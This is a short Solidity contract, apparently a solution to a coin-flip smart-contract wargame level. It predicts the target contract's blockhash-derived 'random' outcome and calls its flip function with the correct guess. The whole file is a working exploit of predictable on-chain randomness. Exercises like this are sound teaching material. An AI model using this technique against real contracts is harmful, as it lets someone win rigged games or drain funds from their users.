// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';
import 'hardhat/console.sol';

interface iCoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract BeatCoinFlip {

  using SafeMath for uint256;
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  iCoinFlip _coinFlip; 

  constructor(address coinFlipContract) public {
    consecutiveWins = 0;
    _coinFlip = iCoinFlip(coinFlipContract);
  }

  function guessFlip() public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;
    bool result;
    result = _coinFlip.flip(side);
    console.log("attack flip result: %s", result);
  }
}